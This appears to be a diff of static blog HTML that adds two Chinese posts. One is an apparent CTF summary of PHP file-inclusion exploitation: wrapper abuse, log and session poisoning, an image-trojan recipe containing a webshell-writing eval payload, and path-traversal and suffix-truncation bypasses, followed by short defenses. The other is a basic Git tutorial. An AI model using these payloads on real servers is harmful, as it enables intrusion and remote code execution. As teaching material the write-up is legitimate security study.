+<p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
+<p>最终的数据包如下：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/95b61469385895.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-95b61469385895.png" alt="QQ截图20160725011007.png"></a></p>
+<p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/content/uploadfile/201607/1c471469385896.png"><img src="https://www.leavesongs.com/content/uploadfile/201607/thum-1c471469385896.png" alt="QQ截图20160725012639.png"></a></p>
+<p>当然，这个方法的条件就是不开启短标签。</p>
+<p>三、zip://</p>
+<p>zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</p>
+<pre><code>zip://中只能传入绝对路径。
+要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
+只需要是zip的压缩包即可，后缀名可以任意更改。
+相同的类型的还有zlib://和bzip2://
+</code></pre>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221548409.png" alt="image-20220226221548409"></p>
+<p>四、data://与phar://</p>
+<p><strong>data://</strong> 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221636438.png" alt="image-20220226221636438"></p>
+<p><strong>phar://</strong> 有点类似zip://同样可以导致 任意代码执行。</p>
+<ul>
+<li>phar://中相对路径和绝对路径都可以使用<br> <img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20190212183933220.png"></li>
+</ul>
+<h2 id="0x05-包含Apache日志文件"><a href="#0x05-包含Apache日志文件" class="headerlink" title="0x05 包含Apache日志文件"></a>0x05 包含Apache日志文件</h2><p>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</p>
+<p>利用条件：a、对日志文件可读  b、知道日志文件存储目录</p>
+<p>（1）日志的物理存放路径</p>
+<p>（2）存在文件包含漏洞</p>
+<p>（3）curl命令行url请求工具或者burpsuite代理；（避免url转码的存在）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226221906093.png" alt="image-20220226221906093"></p>
+<p>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>  如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<?php phpinfo(); ?> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</p>
+<p><strong>获取日志存放路径</strong></p>
+<p><strong>1、日志默认路径</strong></p>
+<p>(1) apache+Linux日志默认路径</p>
+<p> /etc/httpd/logs/access_log   或者   /var/log/httpd/access_log</p>
+<p>(2) apache+win2003日志默认路径</p>
+<p> D:\xampp\apache\logs\access.log</p>
+<p> D:\xampp\apache\logs\error.log</p>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<p> C:\WINDOWS\system32\Logfiles</p>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<p> %SystemDrive%\inetpub\logs\LogFiles</p>
+<p>(5) nginx 日志文件</p>
+<p>日志文件在用户安装目录logs目录下，以我的安装路径为例/usr/local/nginx,那我的日志目录就是在/usr/local/nginx/logs里</p>
+<p><strong>2</strong>、<strong>web中间件默认配置</strong></p>
+<p>(1) apache+linux 默认配置文件</p>
+<p> /etc/httpd/conf/httpd.conf   或者   index.php?page=/etc/init.d/httpd</p>
+<p> (2) IIS6.0+win2003 配置文件</p>
+<p> C:/Windows/system32/inetsrv/metabase.xml</p>
+<p>(3) IIS7.0+WIN 配置文件</p>
+<p> C:\Windows\System32\inetsrv\config\applicationHost.config</p>
+<p><strong>注意：浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。</strong></p>
+<p><strong>curl构造一句话时，需要注意两点：</strong></p>
+<p> 1）请求的资源对象，需要被双引号包含，不然会报错；<br> 2） php一句话中的 综括号[ ]curl是特殊符号，需要进行转义 [ ]，不然curl使用时也会报错；</p>
+<p> Curl 命令行url资源请求，没有像浏览器对特殊字符进行url的转码，所以原封不动的将请求报错的php一句话信息写入了服务日志文件中。随后我们利用文件包含漏洞正常包含解析了本地服务器的日志文件中夹带的“php一句话木马”；</p>
+<p>burpsuit 代理抓包改包构造一句话写入日志文件，burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
+<p>使用burpsuit修改了浏览器访问转码的字符，事情安装我们一句话原本的格式记录进日志文件，并能被php正常解析。</p>
+<h2 id="0x06-包含SESSION"><a href="#0x06-包含SESSION" class="headerlink" title="0x06 包含SESSION"></a>0x06 包含SESSION</h2><p>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>找到Session内的可控变量</li>
+<li>Session文件可读写，并且知道存储路径</li>
+</ul>
+<p>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226222627659.png" alt="image-20220226222627659"></p>
+<p>session常见存储路径：</p>
+<pre><code>/var/lib/php/sess_PHPSESSID
+/var/lib/php/sess_PHPSESSID
+/tmp/sess_PHPSESSID
+/tmp/sessions/sess_PHPSESSID
+session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到
+</code></pre>
+<h2 id="0x07-包含-pros-self-environ"><a href="#0x07-包含-pros-self-environ" class="headerlink" title="0x07 包含/pros/self/environ"></a>0x07 包含/pros/self/environ</h2><p>proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。</p>
+<p><strong>利用条件：</strong></p>
+<ul>
+<li>php以cgi方式运行，这样environ才会保持UA头。</li>
+<li>environ文件存储位置已知，且environ文件可读。</li>
+</ul>
+<h2 id="0x08-包含临时文件"><a href="#0x08-包含临时文件" class="headerlink" title="0x08 包含临时文件"></a>0x08 包含临时文件</h2><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
+<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
+<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</p>
+<h2 id="0x09-包含上传文件"><a href="#0x09-包含上传文件" class="headerlink" title="0x09 包含上传文件"></a>0x09 包含上传文件</h2><p>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</p>
+<p>图片马的制作方式如下，在cmd控制台下输入：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">进入<span class="number">1</span>.<span class="keyword">jph和2.php的文件目录后，执行：</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">copy  <span class="number">1</span>.<span class="keyword">jpg/b+2.php </span> <span class="number">3</span>.<span class="keyword">jpg</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">将图片<span class="number">1</span>.<span class="keyword">jpg和包含php代码的2.php文件合并生成图片马3.jpg</span></span><br></pre></td></tr></table></figure>
+
+<p>假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg<br>图片代码如下：</p>
+<?fputs(fopen("shell.php","w"),"<?php eval($_POST['pass']);?><p>“)?&gt;</p>
+<pre><code>1
+</code></pre>
+<p>然后访问URL：<a target="_blank" rel="noopener" href="http://www.xxxx.com/index.php?page=./upload/201811.jpg%EF%BC%8C%E5%8C%85%E5%90%AB%E8%BF%99%E5%BC%A0%E5%9B%BE%E7%89%87%EF%BC%8C%E5%B0%86%E4%BC%9A%E5%9C%A8index.php%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%94%9F%E6%88%90shell.php">http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php</a></p>
+<h1 id="文件包含漏洞的绕过方法"><a href="#文件包含漏洞的绕过方法" class="headerlink" title="文件包含漏洞的绕过方法"></a>文件包含漏洞的绕过方法</h1><h2 id="0x01-指定前缀绕过"><a href="#0x01-指定前缀绕过" class="headerlink" title="0x01 指定前缀绕过"></a>0x01 指定前缀绕过</h2><h3 id="一、目录遍历"><a href="#一、目录遍历" class="headerlink" title="一、目录遍历"></a>一、目录遍历</h3><p>使用 ../../ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=../../phpinfo/phpinfo.php<br> 测试代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//前缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&quot;/var/www/html/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>.php?<span class="keyword">file</span>=..<span class="regexp">/../</span>log/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，即 /var/log/flag.txt，从而包含成功。</p>
+<h3 id="二、编码绕过"><a href="#二、编码绕过" class="headerlink" title="二、编码绕过"></a>二、编码绕过</h3><p>服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。</p>
+<p><strong>1.利用url编码</strong></p>
+<ul>
+<li>../<ul>
+<li>%2e%2e%2f</li>
+<li>..%2f</li>
+<li>%2e%2e/</li>
+</ul>
+</li>
+<li>..\<ul>
+<li>%2e%2e%5c</li>
+<li>..%5c</li>
+<li>%2e%2e\</li>
+</ul>
+</li>
+</ul>
+<p><strong>2.二次编码</strong></p>
+<ul>
+<li>../   <ul>
+<li>%252e%252e%252f</li>
+</ul>
+</li>
+<li>..\   <ul>
+<li>%252e%252e%255c</li>
+</ul>
+</li>
+</ul>
+<p><strong>3.容器/服务器的编码方式</strong></p>
+<ul>
+<li><p>../</p>
+<ul>
+<li><p>..%c0%af</p>
+</li>
+<li><p>%c0%ae%c0%ae/</p>
+<p>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）Apache Tomcat Directory Traversal</p>
+</li>
+</ul>
+</li>
+<li><p>..\</p>
+<ul>
+<li>..%c1%9c</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x10-指定后缀绕过"><a href="#0x10-指定后缀绕过" class="headerlink" title="0x10 指定后缀绕过"></a>0x10 指定后缀绕过</h2><p>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">	<span class="comment">//后缀</span></span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$file</span>.<span class="string">&quot;.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一、利用url"><a href="#一、利用url" class="headerlink" title="一、利用url"></a>一、利用url</h3><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br> 可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></p>
+<p>完整url格式：</p>
+<p>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</p>
+<p><strong>query(?)</strong></p>
+<ul>
+<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php?</code></li>
+<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php?.txt">http://localhost:8081/phpinfo.php?.txt</a></li>
+</ul>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224648338.png" alt="image-20220226224648338"></p>
+<p><strong>fragment(#)</strong></p>
+<ul>
+<li>[访问参数] <code>?file=http://localhost:8081/phpinfo.php%23</code></li>
+<li>[拼接后]  ?file=<a target="_blank" rel="noopener" href="http://localhost:8081/phpinfo.php#.txt">http://localhost:8081/phpinfo.php#.txt</a></li>
+</ul>
+<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224742608.png" alt="image-20220226224742608"></p>
+<h3 id="二、利用协议"><a href="#二、利用协议" class="headerlink" title="二、利用协议"></a>二、利用协议</h3><p>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</p>
+<p>zip://</p>
+<pre><code>[访问参数] ?file=zip://D:\zip.jpg%23phpinfo
+[拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt
+</code></pre>
+<p>phar://</p>
+<pre><code>[访问参数] ?file=phar://zip.zip/phpinfo
+[拼接后]  ?file=phar://zip.zip/phpinfo.txt
+</code></pre>
+<p>Example：<br>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<?php phpinfo();?>)）<br>所以分别构造payload为：</p>
+<p>?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224921625.png" alt="image-20220226224921625"></p>
+<p>?file=phar://../../php.zip/phpinfo</p>
+<p><img src="/2022/02/26/CTF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20220226224952562.png" alt="image-20220226224952562"></p>
+<h3 id="三、长度截断"><a href="#三、长度截断" class="headerlink" title="三、长度截断"></a>三、长度截断</h3><p>利用条件：</p>
+<pre><code>php版本 &lt; php 5.2.8
+</code></pre>
+<p>原理：</p>
+<pre><code>Windows下目录最大长度为256字节，超出的部分会被丢弃
+Linux下目录最大长度为4096字节，超出的部分会被丢弃。
+</code></pre>
+<p>利用方法：</p>
+<pre><code>只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)
+
+  ?file=./././。。。省略。。。././shell.php
+    1
+</code></pre>
+<p>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</p>
+<p>四、%00截断</p>
+<p>利用条件：</p>
+<pre><code>magic_quotes_gpc = Off
+php版本 &lt; php 5.3.4
+</code></pre>
+<p>利用方法：</p>
+<pre><code>直接在文件名的最后加上%00来截断指定的后缀名
+
+  ?file=shell.php%00
+</code></pre>
+<p>注：现在用到%00阶段的情况已经不多了</p>
+<p>文件包含漏洞防御</p>
+<pre><code>allow_url_include和allow_url_fopen最小权限化
+
+设置open_basedir（open_basedir 将php所能打开的文件限制在指定的目录树中）
+
+白名单限制包含文件，或者严格过滤 
+</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/22/Git/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -215,6 +815,22 @@
 
       <time title="Created: 2022-02-22 15:41:48" itemprop="dateCreated datePublished" datetime="2022-02-22T15:41:48+08:00">2022-02-22</time>
     </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-02-25 22:28:18" itemprop="dateModified" datetime="2022-02-25T22:28:18+08:00">2022-02-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
 
   
     <span class="post-meta-break"></span>
@@ -223,14 +839,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Symbols count in article: </span>
-      <span>0</span>
+      <span>8.6k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>8 mins.</span>
     </span>
 </div>
 
@@ -241,7 +857,339 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          
+          <h1 id="第一章-Git概述"><a href="#第一章-Git概述" class="headerlink" title="第一章 Git概述"></a>第一章 Git概述</h1><p>注：GitHub用户名：cjtyx      git用户签名Echo   </p>
+<p>Git 是一个免费的、开源的<strong>分布式版本控制系统</strong>，可以快速高效地处理从小型到大型的各种项目。<br>Git 易于学习，占地面积小，性能极快。它具有廉价的本地库，方便的暂存区域和多个工作流分支等特性。其性能优于Subversion、CVS，Perforce和ClearCase 等版本控制工具。</p>
+<h2 id="1-1-何为版本控制"><a href="#1-1-何为版本控制" class="headerlink" title="1.1 何为版本控制"></a>1.1 何为版本控制</h2><p>版本控制是一种记录文件内容变化，以便将来查阅特定版本修订情况的系统。<br>版本控制其实最重要的是可以记录文件修改历史记录，从而让用户能够查看历史版本，方便版本切换。</p>
+<p><img src="/2022/02/22/Git/image-20220222163221507.png" alt="image-20220222163221507"></p>
+<h2 id="1-2-为什么需要版本控制"><a href="#1-2-为什么需要版本控制" class="headerlink" title="1.2 为什么需要版本控制"></a>1.2 为什么需要版本控制</h2><p>个人开发过渡到团队协作。</p>
+<p><img src="/2022/02/22/Git/image-20220222163748125.png" alt="image-20220222163748125"></p>
+<h2 id="1-3-版本控制工具"><a href="#1-3-版本控制工具" class="headerlink" title="1.3 版本控制工具"></a>1.3 版本控制工具</h2><ul>
+<li>集中式版本控制工具</li>
+</ul>
+<p>CVS、 SVN(Subversion)、VSS….. .’<br>集中化的版本控制系统诸如CVS,SVN等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。多年以来，这已成为版本控制系统的标准做法。<br>这种做法带来了许多好处,每个人都可以在一定程度上看到项目中的其他人正在做些什么。而管理员也可以轻松掌控每个开发者的权限，并且管理一个集中化的版本控制系统，要远比在各个客户端上维护本地数据库来得轻松容易。<br>事分两面，有好有坏。这么做显而易见的缺点是中央服务器的单点故障。如果服务器宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。</p>
+<p><img src="/2022/02/22/Git/image-20220222164857099.png" alt="image-20220222164857099"></p>
+<ul>
+<li>分布式版本控制工具</li>
+</ul>
+<p>Git、Mercurial、Bazaar、Darcs…….</p>
+<p>像Git这种分布式版本控制工具，客户端提取的不是最新版本的文件快照，而是把代码仓库完整地镜像下来（本地库)。这样任何一处协同工作用的文件发生故障，事后都可以用其他客户端的本地仓库进行恢复。因为每个客户端的每一次文件提取操作，实际上都是一次对整个文件仓库的完整备份。<br>分布式的版本控制系统出现之后,解决了集中式版本控制系统的缺陷:</p>
+<p>1.服务器断网的情况下也可以进行开发(因为版本控制是在本地进行的）</p>
+<p>2.每个客户端保存的也都是整个完整的项目(包含历史记录，更加安全）</p>
+<p><img src="/2022/02/22/Git/image-20220222165614170.png" alt="image-20220222165614170"></p>
+<h2 id="1-4-Git工作机制"><a href="#1-4-Git工作机制" class="headerlink" title="1.4 Git工作机制"></a>1.4 Git工作机制</h2><p><img src="/2022/02/22/Git/image-20220222170405961.png" alt="image-20220222170405961"></p>
+<h2 id="1-5-Git和代码托管中心"><a href="#1-5-Git和代码托管中心" class="headerlink" title="1.5 Git和代码托管中心"></a>1.5 Git和代码托管中心</h2><p>代码托管中心是基于网络服务器的远程代码仓库，一般我们简单称为远程库。</p>
+<p>局域网<br>GitLab</p>
+<p>互联网<br>GitHub(外网)<br>Gitee码云（国内网站)</p>
+<h1 id="第二章-Git安装"><a href="#第二章-Git安装" class="headerlink" title="第二章 Git安装"></a>第二章 Git安装</h1><p>官网地址：<a target="_blank" rel="noopener" href="https://git-scm.com/">https://git-scm.com/</a></p>
+<p><img src="/2022/02/22/Git/image-20220222223735156.png" alt="image-20220222223735156"></p>
+<p>一路默认的</p>
+<h1 id="第三章-Git常用命令"><a href="#第三章-Git常用命令" class="headerlink" title="第三章 Git常用命令"></a>第三章 Git常用命令</h1><p><img src="/2022/02/22/Git/image-20220222225044925.png" alt="image-20220222225044925"></p>
+<h2 id="3-1-设置用户签名"><a href="#3-1-设置用户签名" class="headerlink" title="3.1 设置用户签名"></a>3.1 设置用户签名</h2><p>1）基本语法</p>
+<p>git config –global user.name 用户名</p>
+<p>git config –global user.email 邮箱</p>
+<p><img src="/2022/02/22/Git/image-20220222225733501.png" alt="image-20220222225733501"></p>
+<p>证明是否设置好：cat  ~/.gitconfig  或者  git config –global -l</p>
+<p><img src="/2022/02/22/Git/image-20220222225858333.png" alt="image-20220222225858333"></p>
+<p>说明:<br>签名的作用是区分不同操作者身份。用户的签名信息在每一个版本的提交信息中能够看到,以此确认本次提交是谁做的。Git首次安装必须设置一下用户签名，否则无法提交代码。<br>※注意:这里设置用户签名和将来登录GitHub(或其他代码托管中心）的账号没有任何关系。</p>
+<h2 id="3-2-初始化本地库"><a href="#3-2-初始化本地库" class="headerlink" title="3.2 初始化本地库"></a>3.2 初始化本地库</h2><p>1）基本语法</p>
+<p>git init</p>
+<p>2）案例实操</p>
+<p><img src="/2022/02/22/Git/image-20220223132547247.png" alt="image-20220223132547247"></p>
+<p>ll -a  查看隐藏文件</p>
+<p>git bash用的命令和Linux通用</p>
+<h2 id="3-3-查看本地库状态"><a href="#3-3-查看本地库状态" class="headerlink" title="3.3 查看本地库状态"></a>3.3 查看本地库状态</h2><h3 id="3-3-1-首次查看（工作区没有任何文件）"><a href="#3-3-1-首次查看（工作区没有任何文件）" class="headerlink" title="3.3.1 首次查看（工作区没有任何文件）"></a>3.3.1 首次查看（工作区没有任何文件）</h3><p>git status</p>
+<p><img src="/2022/02/22/Git/image-20220223132909924.png" alt="image-20220223132909924"></p>
+<h3 id="3-3-2-新增文件（hello-txt）"><a href="#3-3-2-新增文件（hello-txt）" class="headerlink" title="3.3.2 新增文件（hello.txt）"></a>3.3.2 新增文件（hello.txt）</h3><p>vim里面yy是复制p是粘贴</p>
+<p><img src="/2022/02/22/Git/image-20220223133407094.png" alt="image-20220223133407094"></p>
+<h3 id="3-3-3-再次查看（检测到未追踪的文件）"><a href="#3-3-3-再次查看（检测到未追踪的文件）" class="headerlink" title="3.3.3 再次查看（检测到未追踪的文件）"></a>3.3.3 再次查看（检测到未追踪的文件）</h3><p><img src="/2022/02/22/Git/image-20220223133558246.png" alt="image-20220223133558246"></p>
+<h2 id="3-4-添加暂存区"><a href="#3-4-添加暂存区" class="headerlink" title="3.4 添加暂存区"></a>3.4 添加暂存区</h2><h3 id="3-4-1-将工作区的文件添加到暂存区"><a href="#3-4-1-将工作区的文件添加到暂存区" class="headerlink" title="3.4.1 将工作区的文件添加到暂存区"></a>3.4.1 将工作区的文件添加到暂存区</h3><p>git add 文件名</p>
+<p><img src="/2022/02/22/Git/image-20220223133948385.png" alt="image-20220223133948385"></p>
+<p>警告：换行符LF将被CRLF替代  Linux换行符为LF，Windows换行符是CRLF。这个警告不用管</p>
+<h3 id="3-4-2-查看状态（检测到暂存区有新文件）"><a href="#3-4-2-查看状态（检测到暂存区有新文件）" class="headerlink" title="3.4.2 查看状态（检测到暂存区有新文件）"></a>3.4.2 查看状态（检测到暂存区有新文件）</h3><p><img src="/2022/02/22/Git/image-20220223134211447.png" alt="image-20220223134211447"></p>
+<p>暂存区的文件可以删除 ：git rm –cached 文件名，工作区文件还是在的</p>
+<p><img src="/2022/02/22/Git/image-20220223134436436.png" alt="image-20220223134436436"></p>
+<p><img src="/2022/02/22/Git/image-20220223134503854.png" alt="image-20220223134503854"></p>
+<h2 id="3-5-提交本地库"><a href="#3-5-提交本地库" class="headerlink" title="3.5 提交本地库"></a>3.5 提交本地库</h2><h3 id="3-5-1-将暂存区的文件提交到本地库"><a href="#3-5-1-将暂存区的文件提交到本地库" class="headerlink" title="3.5.1 将暂存区的文件提交到本地库"></a>3.5.1 将暂存区的文件提交到本地库</h3><p>git commit -m “日志信息” 文件名</p>
+<p><img src="/2022/02/22/Git/image-20220223200054569.png" alt="image-20220223200054569"></p>
+<h3 id="3-5-2-查看状态（没有文件需要提交）"><a href="#3-5-2-查看状态（没有文件需要提交）" class="headerlink" title="3.5.2 查看状态（没有文件需要提交）"></a>3.5.2 查看状态（没有文件需要提交）</h3><p><img src="/2022/02/22/Git/image-20220223200131347.png" alt="image-20220223200131347"></p>
+<p>查看版本 git reflog   或者 git log</p>
+<p><img src="/2022/02/22/Git/image-20220223200933851.png" alt="image-20220223200933851"></p>
+<h2 id="3-6-修改文件（hello-txt）"><a href="#3-6-修改文件（hello-txt）" class="headerlink" title="3.6 修改文件（hello.txt）"></a>3.6 修改文件（hello.txt）</h2><h3 id="3-6-1-查看状态（检测到工作区有文件被修改）"><a href="#3-6-1-查看状态（检测到工作区有文件被修改）" class="headerlink" title="3.6.1  查看状态（检测到工作区有文件被修改）"></a>3.6.1  查看状态（检测到工作区有文件被修改）</h3><p><img src="/2022/02/22/Git/image-20220223201554430.png" alt="image-20220223201554430"></p>
+<h3 id="3-6-2-将修改的文件再次添加到暂存区"><a href="#3-6-2-将修改的文件再次添加到暂存区" class="headerlink" title="3.6.2 将修改的文件再次添加到暂存区"></a>3.6.2 将修改的文件再次添加到暂存区</h3><p><img src="/2022/02/22/Git/image-20220223201645975.png" alt="image-20220223201645975"></p>
+<h3 id="3-6-3-查看状态（工作区的修改添加到了暂存区）"><a href="#3-6-3-查看状态（工作区的修改添加到了暂存区）" class="headerlink" title="3.6.3 查看状态（工作区的修改添加到了暂存区）"></a>3.6.3 查看状态（工作区的修改添加到了暂存区）</h3><p><img src="/2022/02/22/Git/image-20220223201705778.png" alt="image-20220223201705778"></p>
+<h3 id="3-6-4-提交本地库"><a href="#3-6-4-提交本地库" class="headerlink" title="3.6.4 提交本地库"></a>3.6.4 提交本地库</h3><p>git commit -m “my second commit” hello.txt</p>
+<p><img src="/2022/02/22/Git/image-20220223201842936.png" alt="image-20220223201842936"></p>
+<p><img src="/2022/02/22/Git/image-20220223202021790.png" alt="image-20220223202021790"></p>
